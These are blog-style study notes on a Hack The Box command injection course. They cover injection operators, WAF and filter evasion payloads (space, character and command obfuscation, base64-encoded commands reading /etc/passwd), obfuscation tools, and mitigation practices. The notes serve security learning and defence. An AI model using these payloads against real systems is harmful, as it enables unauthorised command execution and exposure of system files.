---
layout: post
title: "Command Injections"
path: "Bug Bounty Hunter"
date: 2025-01-18
category: courses
subcategory: hack-the-box
status: completed
---

[Hack The Box's Command Injections module](https://academy.hackthebox.com/module/details/109)

# Table of Contents
- [1. Overview](#overview)

## 1. Overview
- **Topic(s) covered**: OS command injection vulnerability, filter evasion, preventing and mitigating injection attacks
- **Goal**: Learn how attackers exploit improperly secured user input that is directly executed by the system to access critical files or achieve privilege escalation.

## 2. Command Injection Attacks
Command injection attacks occur when attackers exploit insecure user input that is directly executed as system commands on the back-end server to inject malicious payloads (OS commands).

### 2.1 Entry Points
- **System command execution functions**
  - PHP: `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()`
  - Python: `os.system()`, `subprocess.run()`, `subprocess.Popen()`
  - Node.js: `child_process.exec()`, `child_process.spawn()`

- **User input fields that interact with the system**
  - File upload/download utilities
  - Network tools (ping, traceroute)
  - Domain lookup tools
  - Document processors

- **HTTP headers and parameters**
  - URL parameters (`?file=example.txt`)
  - POST data
  - Cookie values
  - User-Agent strings
  - Referer headers

### 2.2 Injection Methods
- Appending malicious command after a valid command as the payload
- | Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
|:------------------|:-------------------|:---------------------|:----------------|
| Semicolon | ; | %3b | Both |
| New Line | \n | %0a | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe | \| | %7c | Both (only second output is shown) |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR | \|\| | %7c%7c | Second (only if first fails) |
| Sub-Shell | \`\` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |
- **Note**: semicolon (;) won't work with Windows CMD, but work with Windows PowerShell (e.g., `ping -c 1 127.0.0.1; whoami`)

### 2.3 Filter/WAF Evasion
1. Bypass space filters
    - Using Tabs (`%09`)
        - Example: `ping%09127.0.0.1`
    - Using $IFS (Internal Field Separator)
        - Example: `ping${IFS}127.0.0.1`
    - Using Brace Expansion
        - Example: `{ping,-c,1,127.0.0.1}`
    - New Line character (`%0a`)
        - Example: `ping%0a127.0.0.1`

2. Bypass other blacklisted chars filters
    - **Linux Environment Variables**
        - Using ${PATH} for slash: `${PATH:0:1}` -> `/`
        - Using ${LS_COLORS} for semicolon: `${LS_COLORS:10:1}` -> `;`
    
    - **Windows Environment Variables**
        - CMD: `%HOMEPATH:~6,-11%` -> `\`
        - PowerShell: `$env:HOMEPATH[0]` -> `\`
    
    - **Character Shifting**
        - Linux: `$(tr '!-}' '"-~'<<<[)` -> `\`
        - Using ASCII table to find character before target
        - Example: `[` (ASCII 91) shifts to `\` (ASCII 92)

3. Bypass blacklisted commands
    - **Using Quotes**
        - Single quotes: `w'h'o'am'i`
        - Double quotes: `w"h"o"am"i`
        - Works on both Linux and Windows
        
    - **Linux-specific**
        - Backslash: `w\ho\am\i`
        - Position parameter: `who$@ami`
        
    - **Windows-specific**
        - Caret character: `who^ami`
    
    - **Note**: Commands must have even number of quotes when using quote obfuscation.

4. Advanced command obfuscation
    - **Case Manipulation**
        - Windows (case-insensitive): `WhOaMi`
        - Linux (case-sensitive): `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
    
    - **Reversed Commands**
        - Linux: `$(rev<<<'imaohw')`
        - Windows PowerShell: `iex "$('imaohw'[-1..-20] -join '')"`
    
    - **Encoded Commands**
        - Linux Base64:
            ```bash
            bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
            ```
        - Windows Base64:
            ```powershell
            iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
            ```

- **Note**: These bypasses work differently between Linux and Windows environments. Always test the specific environment's behavior.

### 2.4 Tools Used
- **Bashfuscator (Linux)**
    - Installation:
        ```bash
        git clone https://github.com/Bashfuscator/Bashfuscator
        cd Bashfuscator && python3 setup.py install --user
        ```
    - Basic usage:
        ```bash
        ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
        ```

- **Invoke-DOSfuscation (Windows)**
    - Installation:
        ```powershell
        git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
        Import-Module .\Invoke-DOSfuscation.psd1
        ```
    - Basic usage:
        ```powershell
        Invoke-DOSfuscation
        SET COMMAND type file.txt
        encoding
        ```

- **WAFNinja (Multi-platform)**
    - WAF bypass testing tool
    - Installation:
        ```bash
        git clone https://github.com/khalilbijjou/WAFNinja.git
        pip install -r requirements.txt
        ```
    - Basic usage:
        ```bash
        python wafninja.py bypass -u "http://target.com/index.php" -p "q" -d "payload"
        ```

## 3. Mitigation Strategies
- **Avoid System Commands**
    - Use built-in language functions instead of system commands
    - Example: Use `fsockopen()` instead of `ping` command in PHP
    
- **Input Validation**
    - Implement both frontend and backend validation
    - PHP example:
        ```php
        if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
            // process input
        }
        ```
    - JavaScript example:
        ```javascript
        if(/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
            // process input
        }
        ```

- **Input Sanitization**
    - Remove special characters after validation
    - PHP example:
        ```php
        $ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
        ```
    - JavaScript example:
        ```javascript
        var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
        ```

- **Server Configuration**
    - Enable Web Application Firewall (WAF)
    - Use principle of least privilege
    - Disable dangerous functions:
        ```php
        disable_functions=system,exec,shell_exec,passthru
        ```
    - Limit application scope:
        ```php
        open_basedir = '/var/www/html'
        ```
    - Reject double-encoded requests
    - Keep libraries updated

## 4. Resources
- [HTB Command Injection Cheatsheet](./Command_Injections_Module_Cheat_Sheet.pdf): A cheatsheet containing injection operators and filter bypassing techniques
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection): Collection of injection payloads, OS-specific bypass techniques, and WAF evasion methods





